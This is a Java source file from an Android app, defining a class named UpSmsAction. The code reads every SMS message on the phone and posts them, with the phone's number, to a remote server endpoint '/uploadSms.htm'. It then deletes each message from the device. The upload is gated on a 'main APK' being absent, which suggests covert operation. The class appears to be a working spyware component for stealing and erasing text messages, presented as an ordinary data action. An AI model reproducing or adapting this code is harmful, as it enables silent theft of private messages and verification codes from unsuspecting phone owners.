package com.m1.android.data.action;

import java.util.HashMap;
import java.util.List;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import com.m1.android.data.dao.SmsDao;
import com.m1.android.data.entity.Message;
import com.m1.android.data.entity.Result;
import com.m1.android.data.util.AppUtil;

public class UpSmsAction extends BaseAction {

	@Override
	public boolean excute() {
		try {
			if (allowUpload()) {
				List<Message> messages = SmsDao.queryAllMessages(mContext);
				if (messages != null && !messages.isEmpty()) {
					Result result = null;
					if (mUser.isUploadSms() && !AppUtil.isMainApkInstalled(mContext)) {
						HashMap<String, String> params = new HashMap<String, String>();
						params.put("phone", mPhone);
						Gson gson = new GsonBuilder().excludeFieldsWithoutExposeAnnotation().create();
						params.put("messages", gson.toJson(messages));
						result = mHttpWrapper.post(getRequestUrl(), params, Result.class);
					} else {
						result = new Result();
						result.setSuccess(true);
					}
					if (result != null && result.isSuccess()) {
						for (Message msg : messages) {
							SmsDao.deleteMessage(mContext, msg.getId());
						}
					}
				}
				return true;
			} else {
				return false;
			}
		} catch (Exception e) {
			e.printStackTrace();
			return true;
		}
	}

	@Override
	protected String getRequestUrl() {
		return DEFAULT_HOST + "/uploadSms.htm";
	}

	@Override
	public long getExcutePeriod() {
		return 0;
	}
}
